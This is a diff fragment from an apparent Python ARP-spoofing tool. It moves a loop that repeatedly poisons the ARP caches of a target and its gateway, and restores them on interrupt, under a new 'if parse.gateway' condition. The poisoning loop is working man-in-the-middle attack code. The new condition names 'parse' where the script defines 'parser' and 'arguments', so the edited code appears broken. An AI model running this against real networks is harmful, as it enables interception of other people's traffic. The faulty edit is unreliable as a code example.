@@ -39,14 +39,16 @@ def spoof(target_ip, spoof_ip):
 
 arguments = parser.parse_args()
 
+if parse.gateway:
+    try:
+        while True:
+            spoof(arguments.target, arguments.gateway)
+            spoof(arguments.gateway, arguments.target)
+            sys.stdout.flush()
+            time.sleep(2)
 
-try:
-    while True:
-        spoof(arguments.target, arguments.gateway)
-        spoof(arguments.gateway, arguments.target)
-        sys.stdout.flush()
-        time.sleep(2)
-
-except KeyboardInterrupt:
-    restore(arguments.target,arguments.gateway)
-    restore(arguments.gateway, arguments.target)
+    except KeyboardInterrupt:
+        restore(arguments.target,arguments.gateway)
+        restore(arguments.gateway, arguments.target)
+else:
+    pass
